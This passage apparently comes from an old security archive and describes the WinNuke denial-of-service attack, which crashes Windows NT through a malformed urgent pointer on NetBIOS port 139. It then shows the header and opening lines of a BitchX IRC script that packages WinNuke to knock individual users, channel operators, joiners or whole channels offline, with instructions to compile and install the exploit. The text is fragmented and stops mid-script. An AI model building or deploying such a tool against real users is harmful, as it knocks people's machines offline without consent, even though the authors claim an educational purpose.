The receiver uses the URGENT POINTER to determine where in the segment the urgent data ends. Windows NT bugchecks when the URGENT POINTER points to the end of the frame and no normal data follows. Windows NT expects normal data to follow. \" ， As a result of this assumption not being met , Windows gives a \"blue screen of death\" and stops responding. ， Windows port 139 ( NetBIOS ) is most susceptible to this attack. although other services may suffer as well. Rebooting the affected machine is required to resume normal system functioning. ，  # WinNuke BitchX IRC script/wnuke package v 1.5 ，  # Created by maddog and lerper ，  # maddog @ bitsmart.com , lerper @ bitsmart.com ，  # WinNuke IRCers with several options :  ，  # the nick you define ，  # all of the ops in your current channel ，  # anyone who joins a channel ，  # everyone in the channel ，  # Creditz :  ，  # goes out to _eci for winnuke ，  #  # BitchX for their great support ，  #  # ircII for pretending to be asleep whenever i asked for help ，  #  # hack for the laughs ( hey-they were talking about vibrators last night )  ，  # Micro $ oft for hosting the hacking channels on comic chat ，  # KL and his LPLC LAX ，  # shout outs to the L0pht and hey to memebers of \"CdC\" ，  # notice : this package was created so more people could learn about winnuke ，  # and more winblows users could patch themeslves up. ，  # NOT so lame ircers could have their kicks ，  # Before using this script , compile the included winnuke.c ，  # cc -owinnuke winnuke.c should do the job !  ，  # If you have a GNU compiler...replace the cc with gcc ，  # Then move the executable into your /usr/local/bin directory and ，  # chmod it with the access levels you wish. ， assign wnuke_pgm wnuke ， assign wn [ wnuke w/ mass nuke features ]  ， assign wi [ winnuke commands ]  ， eval",
